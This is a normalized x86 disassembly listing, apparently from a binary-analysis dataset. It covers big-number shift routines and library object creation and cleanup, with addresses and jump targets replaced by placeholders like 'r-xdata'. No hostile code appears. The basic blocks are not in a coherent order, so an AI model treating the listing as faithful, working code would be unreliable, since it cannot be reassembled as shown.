cmp eax [ esi + 0x8 ]
jg r-xdata
mov eax [ esi + 0x4 ]
pop edi
test eax eax
pop ebp
jle r-xdata
lea ecx [ ebp + eax * 4 ]
sub edi ebp
lea ebx [ eax + 0x1 ]
push eax
push esi
call sub_10029af0
add esp 0x8
mov eax esi
jmp r-xdata
pop esi
mov eax 0x1
pop ebx
retn
mov ecx [ esi ]
lea eax [ ecx + eax * 4 - 0x4 ]
mov eax [ edi + ecx ]
sub ecx 0x4
mov ebp eax
shr ebp 0x1
or ebp edx
mov [ ecx + 0x4 ] ebp
shl eax 0x1f
dec ebx
mov edx eax
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ ebx + 0xc ]
mov [ esi + 0xc ] edx
pop esi
pop ebx
retn
test eax eax
jne r-xdata
mov edx [ esi + 0x4 ]
dec edx
mov ecx edx
mov [ esi + 0x4 ] edx
test ecx ecx
jg r-xdata
mov edx [ eax ]
sub eax 0x4
test edx edx
jne r-xdata
sub_10035e90
mov eax 0x8
call sub_1001d0d0
mov ecx [ esp + 0xc ]
push ebp
push esi
mov esi [ esp + 0x1c ]
push edi
mov edi [ esp + 0x1c ]
mov eax [ edi + 0xc ]
mov [ ecx + 0xc ] eax
mov eax esi
cdq
and edx 0x1f
add eax edx
mov edx [ edi + 0x4 ]
mov ebp eax
sar ebp 0x5
lea eax [ edx + ebp + 0x1 ]
mov edx [ ecx + 0x8 ]
cmp eax edx
jg r-xdata
push eax
push ecx
call sub_10029af0
add esp 0x8
mov eax ecx
jmp r-xdata
and esi 0x8000001f
push ebx
jns r-xdata
pop edi
pop esi
pop ebp
add esp 0x8
retn
test eax eax
jne r-xdata
mov ecx [ esp + 0x1c ]
mov eax [ edi ]
mov ebx 0x20
mov edx [ ecx ]
mov ecx [ edi + 0x4 ]
add ecx ebp
sub ebx esi
test esi esi
mov [ edx + ecx * 4 ] 0x0
mov edi [ edi + 0x4 ]
mov [ esp + 0x14 ] edx
jne r-xdata
dec esi
or esi 0xffffffe0
inc esi
dec edi
js r-xdata
dec edi
js r-xdata
mov ecx ebp
xor eax eax
mov edi edx
pop ebx
[ edi ]
mov eax [ esp + 0x1c ]
mov ecx [ eax + 0x4 ]
mov eax [ esp + 0x18 ]
lea ebp [ ecx + ebp + 0x1 ]
test ebp ebp
mov [ eax + 0x4 ] ebp
jle r-xdata
lea eax [ eax + edi * 4 ]
lea ecx [ edi + ebp ]
inc edi
mov [ esp + 0x24 ] eax
lea eax [ edx + ecx * 4 + 0x4 ]
mov [ esp + 0x10 ] edi
lea ecx [ edi + ebp ]
lea eax [ eax + edi * 4 ]
lea esi [ edi + 0x1 ]
lea ecx [ edx + ecx * 4 ]
pop edi
pop esi
mov eax 0x1
pop ebp
add esp 0x8
retn
mov edx [ eax ]
lea ecx [ edx + ebp * 4 - 0x4 ]
mov edx [ esp + 0x24 ]
mov ecx ebx
add eax 0xfffffffc
mov edx [ edx ]
mov edi edx
shr edi cl
mov ecx [ eax + 0x4 ]
or ecx edi
mov [ eax + 0x4 ] ecx
mov ecx esi
shl edx cl
mov ecx [ esp + 0x10 ]
mov [ eax ] edx
mov edx [ esp + 0x24 ]
sub edx 0x4
dec ecx
mov [ esp + 0x24 ] edx
mov [ esp + 0x10 ] ecx
jne r-xdata
mov edx [ esp + 0x14 ]
mov edi [ eax ]
sub eax 0x4
mov [ ecx ] edi
sub ecx 0x4
dec esi
jne r-xdata
jmp r-xdata
mov esi [ eax + 0x4 ]
dec esi
mov edx esi
mov [ eax + 0x4 ] esi
test edx edx
jg r-xdata
mov edx [ ecx ]
sub ecx 0x4
test edx edx
jne r-xdata
sub_10035fd0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x1c ]
mov eax edi
mov ebx edi
cdq
and edx 0x1f
add eax edx
mov esi eax
sar esi 0x5
and ebx 0x8000001f
jns r-xdata
mov ecx [ esp + 0x18 ]
mov eax 0x20
sub eax ebx
mov [ esp + 0x1c ] eax
mov eax [ ecx + 0x4 ]
cmp esi eax
jge r-xdata
dec ebx
or ebx 0xffffffe0
inc ebx
mov eax [ esp + 0x14 ]
push 0x0
push eax
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov ebp [ esp + 0x14 ]
cmp ebp ecx
je r-xdata
test edi edi
je r-xdata
mov eax [ ecx + 0xc ]
mov [ ebp + 0xc ] eax
mov edx [ ecx + 0x4 ]
sub edx esi
lea eax [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
cmp eax edx
jg r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov eax [ ecx ]
mov ecx [ ecx + 0x4 ]
mov edi [ ebp ]
sub ecx esi
test ebx ebx
lea eax [ eax + esi * 4 ]
mov [ ebp + 0x4 ] ecx
jne r-xdata
push eax
push ebp
call sub_10029af0
mov ecx [ esp + 0x20 ]
add esp 0x8
mov eax ebp
jmp r-xdata
mov esi [ eax ]
add eax 0x4
dec ecx
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
test eax eax
jne r-xdata
mov ecx ebx
shr esi cl
mov [ edi ] esi
mov [ esp + 0x18 ] ecx
mov eax [ ebp + 0x4 ]
test eax eax
jle r-xdata
mov edx [ eax ]
add eax 0x4
mov [ edi ] edx
add edi 0x4
dec ecx
jne r-xdata
mov ecx [ ebp ]
lea eax [ ecx + eax * 4 - 0x4 ]
mov edx esi
mov esi [ eax ]
mov ecx ebx
mov ebp esi
shr edx cl
mov ecx [ esp + 0x1c ]
add eax 0x4
shl ebp cl
mov ecx [ esp + 0x18 ]
add edi 0x4
or ebp edx
dec ecx
mov [ edi - 0x4 ] ebp
mov [ esp + 0x18 ] ecx
jne r-xdata
mov ebp [ esp + 0x14 ]
jmp r-xdata
mov edx [ ebp + 0x4 ]
dec edx
mov ecx edx
mov [ ebp + 0x4 ] edx
test ecx ecx
jg r-xdata
mov edx [ eax ]
sub eax 0x4
test edx edx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
sub_10036110
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
push esi
push 0x6f
push r--data
push 0x18
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
xor eax eax
retn
mov [ esi ] 0x0
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x72
push r--data
push 0x41
push 0x64
push 0x2a
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] 0x0
call sub_10055470
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
call sub_10054b50
mov [ rw-data ] eax
mov ecx [ esi + 0xc ]
lea eax [ esi + 0x10 ]
push eax
push esi
mov edx [ ecx + 0x10 ]
push 0xc
mov [ esi + 0x8 ] edx
call sub_1001f420
add esp 0xc
mov eax esi
pop esi
retn
push eax
call sub_10055490
add esp 0x4
mov [ esi + 0xc ] eax
test eax eax
jne r-xdata
push 0x82
push r--data
push 0x26
push 0x64
push 0x2a
call sub_1001de60
mov eax [ esi + 0x4 ]
push eax
call sub_10022640
push esi
call sub_1001d740
add esp 0x1c
xor eax eax
pop esi
retn
sub_100361e0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + 0x10 ]
push eax
push esi
push 0xc
call sub_1001f490
push 0x18
push esi
call sub_10026870
push esi
call sub_1001d740
add esp 0x18
pop esi
retn
push eax
call sub_10022640
add esp 0x4
sub_10036220
push esi
push edi
mov edi [ esp + 0xc ]
push sub_100361e0
push sub_100361e0
push sub_10036110
push edi
call sub_100294a0
add esp 0x10
test eax eax
jne r-xdata
mov esi eax
pop edi
pop esi
retn
push 0x6f
push r--data
push 0x18
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov [ esi ] 0x0
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x72
push r--data
push 0x41
push 0x64
push 0x2a
call sub_1001de60
add esp 0x14
jmp r-xdata
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] 0x0
call sub_10055470
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
call sub_10054b50
mov [ rw-data ] eax
test esi esi
jne r-xdata
mov ecx [ esi + 0xc ]
lea eax [ esi + 0x10 ]
push eax
push esi
mov edx [ ecx + 0x10 ]
push 0xc
mov [ esi + 0x8 ] edx
call sub_1001f420
add esp 0xc
push eax
call sub_10055490
add esp 0x4
mov [ esi + 0xc ] eax
test eax eax
jne r-xdata
push sub_100361e0
push sub_100361e0
push sub_10036110
push esi
push edi
call sub_100294c0
add esp 0x14
mov eax esi
pop edi
pop esi
retn
pop edi
xor eax eax
pop esi
retn
push 0x82
push r--data
push 0x26
push 0x64
push 0x2a
call sub_1001de60
mov eax [ esi + 0x4 ]
push eax
call sub_10022640
push esi
call sub_1001d740
add esp 0x1c
xor esi esi
jmp r-xdata
sub_10036330
mov eax 0x10
call sub_1001d0d0
mov eax [ esp + 0x14 ]
push esi
test eax eax
push edi
jne r-xdata
push eax
call sub_1002cb10
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
pop edi
pop esi
add esp 0x10
retn
call sub_100299b0
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
add esp 0x10
retn
push 0x0
push esi
push edi
call sub_1002cb20
add esp 0xc
test eax eax
push esi
jne r-xdata
pop edi
pop esi
add esp 0x10
retn
call sub_10029870
add eax 0x7
lea ecx [ esp + 0xc ]
cdq
and edx 0x7
push 0x0
add eax edx
push ecx
sar eax 0x3
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x28 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] 0x2
mov [ esp + 0x28 ] 0xff
call sub_1002eeb0
shl eax 0x1
push 0x10
push eax
push 0x1
call sub_1002eb00
push esi
mov edi eax
call sub_100298f0
add esp 0x1c
mov eax edi
pop edi
pop esi
add esp 0x10
retn
call sub_100298f0
add esp 0x4
xor eax eax
pop edi
pop esi
add esp 0x10
retn
sub_10036400
push ebx
push esi
push edi
push 0x84
push r--data
push 0x44
call sub_1001d4c0
mov esi eax
xor edi edi
add esp 0xc
cmp esi edi
jne r-xdata
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
push 0x87
push r--data
push 0x41
push 0x67
push 0xa
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0x10 ]
mov [ esi + 0x3c ] eax
cmp ebx edi
je r-xdata
call sub_100554a0
mov [ rw-data ] eax
call sub_10055c70
mov [ esi + 0x40 ] eax
push ebx
call sub_100225b0
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esi + 0x3c ]
mov eax 0x1
lea ebx [ esi + 0x34 ]
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] eax
mov edx [ ecx + 0x20 ]
push ebx
push esi
push 0x7
mov [ esi + 0x28 ] edx
call sub_1001f420
mov eax [ esi + 0x3c ]
add esp 0xc
mov eax [ eax + 0x18 ]
cmp eax edi
je r-xdata
push eax
call sub_1002b5d0
add esp 0x4
cmp eax edi
mov [ esi + 0x3c ] eax
jne r-xdata
mov [ esi + 0x40 ] ebx
jmp r-xdata
push 0x90
push r--data
push 0x26
push 0x67
push 0xa
call sub_1001de60
push esi
call sub_1001d740
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebx
retn
mov eax esi
pop edi
pop esi
pop ebx
retn
push esi
call eax
add esp 0x4
test eax eax
jne r-xdata
push 0x9e
push r--data
push 0x26
push 0x67
push 0xa
call sub_1001de60
mov eax [ esi + 0x40 ]
push eax
call sub_10022640
push esi
call sub_1001d740
add esp 0x1c
xor eax eax
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x40 ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x40 ]
cmp eax edi
je r-xdata
push ebx
push esi
push 0x7
call sub_1001f490
push esi
call sub_1001d740
add esp 0x10
xor esi esi
push eax
call sub_10022640
add esp 0x4
sub_10036560
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0xd7
push r--data
push 0x8
lea eax [ esi + 0x30 ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
mov ecx [ esi + 0x3c ]
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push esi
call eax
add esp 0x4
lea edx [ esi + 0x34 ]
push edx
push esi
push 0x7
call sub_1001f490
mov eax [ esi + 0xc ]
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_10022640
add esp 0x4
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
push eax
call sub_100298f0
add esp 0x4
sub_100366a0
mov eax [ esp + 0x8 ]
push ebp
push eax
call sub_10022900
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
mov eax 0xfffffffe
pop ebp
retn
pop edi
pop esi
pop ebx
or eax 0xffffffff
pop ebp
retn
mov ecx [ esp + 0x1c ]
lea esi [ ecx + 0x1 ]
test esi esi
jge r-xdata
push edi
call sub_1001e7b0
mov ebx eax
add esp 0x4
cmp esi ebx
jge r-xdata
xor esi esi
push esi
push edi
call sub_1001e7c0
mov edx [ eax ]
push ebp
push edx
call sub_10030b10
add esp 0x10
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
cmp esi ebx
jl r-xdata
sub_10036710
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_1001e7b0
mov ecx [ esp + 0x10 ]
add esp 0x4
cmp eax ecx
jle r-xdata
test ecx ecx
jl r-xdata
push ecx
push esi
call sub_1001e7c0
add esp 0x8
pop esi
retn
sub_100367d0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
mov ecx [ eax ]
mov edx [ ecx + 0x24 ]
push edx
call sub_10055d80
add esp 0x10
retn
sub_10036880
push esi
mov esi [ esp + 0xc ]
lea eax [ esp + 0x10 ]
mov ecx [ esi ]
push eax
push ecx
push r--data
call sub_10056070
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x1c ]
push edx
push eax
push r--data
call sub_100563f0
mov eax [ esp + 0x28 ]
add esp 0x18
pop esi
retn
sub_100368c0
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
push r--data
call sub_10033120
mov esi eax
add esp 0x4
test esi esi
mov [ esp + 0x10 ] esi
jne r-xdata
mov eax [ esp + 0x20 ]
xor ebx ebx
push eax
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push 0x68
push r--data
push 0x41
push 0x66
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov ecx [ esp + 0x20 ]
push ebx
push ecx
call sub_1001e7c0
mov ebp eax
add esp 0x8
mov esi r--data
mov edi [ ebp + 0x4 ]
mov eax edi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov esi r--data
mov eax edi
mov eax [ esp + 0x10 ]
push eax
push ebp
call sub_10056540
add esp 0x8
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edx [ esp + 0x10 ]
push r--data
push edx
call sub_10033840
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push 0x72
push r--data
push 0x6a
push 0x66
push 0x22
call sub_1001de60
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x4 ]
mov ecx [ ebp ]
push edx
push r--data
push eax
push r--data
push ecx
push r--data
push 0x6
call sub_1001e1a0
add esp 0x30
mov eax [ esp + 0x10 ]
add eax 0x4
push eax
push ebp
call sub_10056890
add esp 0x8
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov ecx [ esp + 0x20 ]
inc ebx
push ecx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi [ esp + 0x10 ]
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_10036aa0
push esi
push edi
push 0x8c
push r--data
push 0x24
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ecx 0x9
xor eax eax
mov edi esi
[ edi ]
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push 0x8e
push r--data
push 0x41
push 0x66
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push eax
call sub_10029b30
add esp 0x4
mov [ esi ] eax
test eax eax
je r-xdata
mov edi [ esp + 0x14 ]
push edi
call sub_10029b30
add esp 0x4
mov [ esi + 0xc ] eax
test eax eax
jne r-xdata
push eax
call sub_10029b30
add esp 0x4
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov dl [ edi + 0x10 ]
mov ecx 0x4
test cl dl
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
mov [ esi + 0x14 ] 0x20
mov eax esi
pop edi
pop esi
retn
or [ eax + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
retn
push eax
call sub_10029950
add esp 0x4
sub_10036b90
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
push eax
call sub_10029950
add esp 0x4
sub_10036bf0
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi ]
test eax eax
je r-xdata
push 0xb9
push r--data
push 0x6b
push 0x67
push 0x3
call sub_1001de60
add esp 0x14
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
retn
mov [ esi + 0x14 ] 0x20
mov ecx [ esi + 0x14 ]
dec ecx
mov [ esi + 0x14 ] ecx
jne r-xdata
test [ esi + 0x18 ] 0x1
jne r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov ebx 0x1
jmp r-xdata
mov edi [ esp + 0x14 ]
mov ecx [ esi + 0xc ]
push edi
push ecx
push eax
push eax
push eax
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
test [ esi + 0x18 ] 0x2
jne r-xdata
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
mov edx [ esi + 0xc ]
mov eax [ esi + 0x4 ]
push edi
push edx
push eax
push eax
push eax
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
push ebx
push ebx
push eax
push ebx
push ebx
push esi
call sub_10036dd0
add esp 0x18
test eax eax
je r-xdata
mov ebx 0x1
jmp r-xdata
sub_10036cb0
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi 0x1
cmp [ esi ] 0x0
je r-xdata
push 0xde
push r--data
push 0x6b
push 0x64
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esi + 0xc ]
mov edx [ esi ]
push eax
mov eax [ esp + 0x10 ]
push ecx
push edx
push eax
push eax
call sub_10057b10
add esp 0x14
test eax eax
jne r-xdata
push eax
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
retn
xor edi edi
xor edi edi
sub_10036d30
push ebx
push esi
mov esi [ esp + 0x14 ]
push edi
cmp [ esi ] 0x0
je r-xdata
push 0xf8
push r--data
push 0x6b
push 0x65
push 0x3
call sub_1001de60
add esp 0x14
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
mov ebx [ esp + 0x1c ]
test ecx ecx
push ebx
je r-xdata
mov ecx [ esi + 0xc ]
push ecx
push eax
mov eax [ esi + 0xc ]
push eax
push ecx
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
push ebx
push esi
call sub_10036bf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
push eax
push eax
call sub_10057b10
mov edi eax
add esp 0x14
test edi edi
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
sub_10036dd0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
test ebp ebp
push edi
mov ebx 0x20
jne r-xdata
mov esi ebp
mov eax [ esp + 0x1c ]
push eax
push ebp
push ebp
call sub_10036aa0
add esp 0xc
mov esi eax
jmp r-xdata
test ebp ebp
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
test esi esi
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
call sub_100299b0
test eax eax
mov [ esi ] eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
call sub_100299b0
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
push edi
call sub_10029b30
add esp 0x4
mov [ esi + 0x8 ] eax
push eax
call sub_10029950
add esp 0x4
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov [ esi + 0x20 ] eax
push esi
call sub_1001d740
add esp 0x4
xor esi esi
push eax
call sub_10029950
add esp 0x4
mov ecx [ esi + 0xc ]
mov edx [ esi ]
push ecx
push edx
call sub_100494a0
add esp 0x8
test eax eax
je r-xdata
mov [ esi + 0x1c ] eax
mov edi [ esp + 0x20 ]
mov edx [ esi + 0x20 ]
test edx edx
je r-xdata
call sub_1001e020
and eax 0xfff
cmp eax 0x6c
jne r-xdata
mov edx [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ esi ]
push edi
push edx
push ecx
push eax
push eax
call sub_1004c7d0
add esp 0x14
test eax eax
jne r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax ebx
dec ebx
test eax eax
je r-xdata
mov eax [ esi ]
push ecx
mov ecx [ esi + 0xc ]
push edi
push ecx
mov ecx [ esi + 0x8 ]
push ecx
push eax
push eax
call edx
add esp 0x18
test eax eax
je r-xdata
push 0x14d
push r--data
push 0x71
push 0x80
push 0x3
call sub_1001de60
add esp 0x14
jmp r-xdata
call sub_1001df60
mov ecx [ esi + 0xc ]
mov edx [ esi ]
push ecx
push edx
call sub_100494a0
add esp 0x8
test eax eax
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0xc ]
mov ecx [ esi ]
mov edx [ esi + 0x4 ]
push edi
push eax
push ecx
push edx
call sub_10036f90
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
sub_10036f90
mov eax 0x40
call sub_1001d0d0
xor eax eax
push ebx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x4c ]
push ebp
push esi
push edi
test [ eax + 0x10 ] 0x4
jne r-xdata
mov ebx [ esp + 0x60 ]
xor eax eax
push ebx
mov [ esp + 0x20 ] eax
mov [ esp + 0x14 ] eax
call sub_1002dd20
push ebx
call sub_1002de70
push ebx
mov esi eax
call sub_1002de70
push ebx
mov edi eax
call sub_1002de70
push ebx
mov [ esp + 0x2c ] eax
call sub_1002de70
push ebx
mov [ esp + 0x38 ] eax
call sub_1002de70
push ebx
mov [ esp + 0x30 ] eax
call sub_1002de70
mov ebp eax
push ebx
mov [ esp + 0x80 ] ebp
call sub_1002de70
add esp 0x20
test eax eax
mov eax [ esp + 0x54 ]
je r-xdata
mov ecx [ esp + 0x5c ]
test [ ecx + 0x10 ] 0x4
jne r-xdata
mov eax [ esp + 0x54 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov edi [ esp + 0x60 ]
push edi
call sub_1002dd20
push edi
call sub_1002de70
push edi
mov [ esp + 0x1c ] eax
call sub_1002de70
push edi
mov esi eax
call sub_1002de70
push edi
mov [ esp + 0x2c ] eax
call sub_1002de70
push edi
mov ebp eax
call sub_1002de70
push edi
mov ebx eax
call sub_1002de70
push edi
mov [ esp + 0x34 ] eax
call sub_1002de70
add esp 0x20
mov [ esp + 0x24 ] eax
test eax eax
mov eax [ esp + 0x54 ]
je r-xdata
push ebx
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn
mov eax [ esp + 0x1c ]
push eax
call sub_10029950
add esp 0x4
test eax eax
mov [ esp + 0x1c ] eax
je r-xdata
call sub_100299b0
mov eax [ esp + 0x54 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
push 0x1
push edx
call sub_10029cf0
push 0x0
push ebp
call sub_10029cf0
mov eax [ esp + 0x68 ]
push eax
push edi
call sub_10029bf0
add esp 0x18
test eax eax
je r-xdata
mov ecx [ esp + 0x60 ]
push ecx
call sub_1002de00
mov eax [ esp + 0x24 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn
mov eax [ esp + 0x1c ]
push eax
call sub_10029950
add esp 0x4
test eax eax
mov [ esp + 0x1c ] eax
je r-xdata
call sub_100299b0
mov ecx [ esp + 0x5c ]
push ecx
push esi
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
push 0x1
push edx
call sub_10029cf0
mov eax [ esp + 0x1c ]
push 0x0
push eax
call sub_10029cf0
mov ecx [ esp + 0x68 ]
push ecx
push esi
call sub_10029bf0
add esp 0x18
test eax eax
je r-xdata
mov [ esi + 0xc ] 0x0
mov eax [ edi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x5c ]
mov eax [ esp + 0x10 ]
push edx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi ]
push ebx
mov [ esp + 0x2c ] edx
mov eax [ edi + 0x4 ]
mov [ esp + 0x30 ] eax
mov ecx [ edi + 0x8 ]
mov [ esp + 0x34 ] ecx
mov edx [ edi + 0xc ]
mov ecx [ esp + 0x3c ]
mov [ esp + 0x38 ] edx
mov eax [ edi + 0x10 ]
and ecx 0x1
and al 0xfe
lea edx [ esp + 0x2c ]
or eax ecx
push esi
or al 0x6
push edx
push edi
mov [ esp + 0x48 ] eax
call sub_100579b0
add esp 0x10
test eax eax
je r-xdata
push esi
push edi
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
mov ecx [ esp + 0x10 ]
mov [ ecx + 0xc ] 0x0
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ esp + 0x58 ] 0xffffffff
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push edi
push eax
push esi
push esi
call sub_100579b0
add esp 0x10
test eax eax
je r-xdata
mov edx ecx
push edx
push esi
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
